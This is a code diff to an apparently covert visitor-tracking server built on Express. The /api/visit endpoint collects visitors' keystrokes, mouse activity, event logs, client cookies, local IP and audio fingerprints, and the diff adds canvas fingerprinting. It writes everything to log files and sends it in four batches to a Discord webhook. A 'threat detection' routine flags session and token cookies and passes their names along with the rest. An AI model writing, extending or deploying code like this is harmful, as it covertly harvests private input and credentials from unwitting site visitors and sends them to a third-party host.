@@ -98,17 +98,17 @@ app.get('/', (req, res) => {
 });
 
 function getClientIP(req) {
-  const allIPs = new Set(); 
+  const allIPs = new Set();
 
   const ipHeaders = [
     'x-forwarded-for',
-    'cf-connecting-ip', 
+    'cf-connecting-ip',
     'true-client-ip',
-    'x-real-ip', 
-    'x-client-ip', 
+    'x-real-ip',
+    'x-client-ip',
     'forwarded',
-    'x-cluster-client-ip', 
-    'fastly-client-ip', 
+    'x-cluster-client-ip',
+    'fastly-client-ip',
     'x-original-forwarded-for'
   ];
 
@@ -126,13 +126,13 @@ function getClientIP(req) {
     }
   }
 
-  const socketIP = req.socket.remoteAddress?.replace(/^::ffff:/, ''); 
+  const socketIP = req.socket.remoteAddress?.replace(/^::ffff:/, '');
   if (isValidIP(socketIP)) {
     allIPs.add(socketIP);
   }
 
   const allIPsArray = Array.from(allIPs);
-  const primary = allIPsArray[0] || '127.0.0.1'; 
+  const primary = allIPsArray[0] || '127.0.0.1';
 
   logger.info('Detected IPs', { primary, all: allIPsArray });
 
@@ -180,7 +180,7 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
-  if (Object.keys(req.cookies).length > 0 && Object.values(req.cookies).some(value => value.length > 100 || value.includes('session') || value.includes('token'))) {
+  if (req.cookies && Object.keys(req.cookies).length > 0 && Object.values(req.cookies).some(value => value.length > 100 || value.includes('session') || value.includes('token'))) {
     threats.push({
       type: 'Suspicious Cookie Content',
       details: `Potentially sensitive or oversized cookies detected: ${JSON.stringify(Object.keys(req.cookies))}`
@@ -250,7 +250,7 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
-  if (req.body.part4?.cookies && req.body.part4.cookies.includes('token') || req.body.part4.cookies.includes('session')) {
+  if (req.body.part4?.clientCookies && (req.body.part4.clientCookies.includes('token') || req.body.part4.clientCookies.includes('session'))) {
     threats.push({
       type: 'Sensitive Client Cookies',
       details: 'Potentially sensitive data in client-sent cookies'
@@ -336,7 +336,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       batteryStatus: req.body.batteryStatus || 'Unknown',
       currentUrl: req.body.currentUrl || 'Unknown',
       scrollPosition: req.body.scrollPosition || 'Unknown',
-      cookies: JSON.stringify(req.cookies) || '{}', // Server-side cookies for your domain
+      cookies: JSON.stringify(req.cookies) || '{}',
       part3: {
         keystrokes: req.body.part3?.keystrokes || 'None',
         mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
@@ -358,10 +358,11 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
         eventLog: req.body.part3?.eventLog || 'None'
       },
       part4: {
-        clientCookies: req.body.part4?.clientCookies || 'None', 
-        localStorageUsage: req.body.part4?.localStorageUsage || 'Unknown', 
-        localIP: req.body.part4?.localIP || 'Unknown', 
-        audioFingerprint: req.body.part4?.audioFingerprint || 'None' 
+        clientCookies: req.body.part4?.clientCookies || 'None',
+        localStorageUsage: req.body.part4?.localStorageUsage || 'Unknown',
+        localIP: req.body.part4?.localIP || 'Unknown',
+        canvasFingerprint: req.body.part4?.canvasFingerprint || 'None',
+        audioFingerprint: req.body.part4?.audioFingerprint || 'None'
       }
     };
 
@@ -426,6 +427,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Part 4: Client Cookies', value: visitorInfo.part4.clientCookies, inline: true },
       { name: 'Part 4: Local Storage Usage', value: visitorInfo.part4.localStorageUsage, inline: true },
       { name: 'Part 4: Local IP', value: visitorInfo.part4.localIP, inline: true },
+      { name: 'Part 4: Canvas Fingerprint', value: visitorInfo.part4.canvasFingerprint, inline: true },
       { name: 'Part 4: Audio Fingerprint', value: visitorInfo.part4.audioFingerprint, inline: true },
       { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
     ];
@@ -433,7 +435,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     const firstBatch = fields.slice(0, 15);
     const secondBatch = fields.slice(15, 30);
     const thirdBatch = fields.slice(30, 45);
-    const fourthBatch = fields.slice(45); 
+    const fourthBatch = fields.slice(45);
 
     const payload1 = {
       embeds: [{
@@ -472,7 +474,6 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     };
 
     try {
-      // Save payloads to .txt files
       const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
       const logDir = path.join(__dirname, 'logs');
       await fs.mkdir(logDir, { recursive: true });
@@ -493,7 +494,6 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       await fs.writeFile(logFile4, JSON.stringify(payload4, null, 2));
       logger.info('Saved webhook payload 4 to file', { file: logFile4, payloadSize: JSON.stringify(payload4).length });
 
-      // Send first webhook
       logger.info('Attempting to send to Discord Webhook (Part 1)', { webhookURL, payloadSize: JSON.stringify(payload1).length });
       const webhookResponse1 = await fetch(webhookURL, {
         method: 'POST',
@@ -514,10 +514,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
       logger.info('Successfully sent to Discord Webhook (Part 1)', { status: webhookResponse1.status, webhookURL });
 
-      // Delay to avoid rate limits
       await new Promise(resolve => setTimeout(resolve, 2000));
 
-      // Send second webhook
       logger.info('Attempting to send to Discord Webhook (Part 2)', { webhookURL, payloadSize: JSON.stringify(payload2).length });
       const webhookResponse2 = await fetch(webhookURL, {
         method: 'POST',
@@ -538,10 +536,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
       logger.info('Successfully sent to Discord Webhook (Part 2)', { status: webhookResponse2.status, webhookURL });
 
-      // Delay to avoid rate limits
       await new Promise(resolve => setTimeout(resolve, 2000));
 
-      // Send third webhook
       logger.info('Attempting to send to Discord Webhook (Part 3)', { webhookURL, payloadSize: JSON.stringify(payload3).length });
       const webhookResponse3 = await fetch(webhookURL, {
         method: 'POST',
@@ -562,10 +558,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
       logger.info('Successfully sent to Discord Webhook (Part 3)', { status: webhookResponse3.status, webhookURL });
 
-      // Delay to avoid rate limits
       await new Promise(resolve => setTimeout(resolve, 2000));
 
-      // Send fourth webhook
       logger.info('Attempting to send to Discord Webhook (Part 4)', { webhookURL, payloadSize: JSON.stringify(payload4).length });
       const webhookResponse4 = await fetch(webhookURL, {
         method: 'POST',
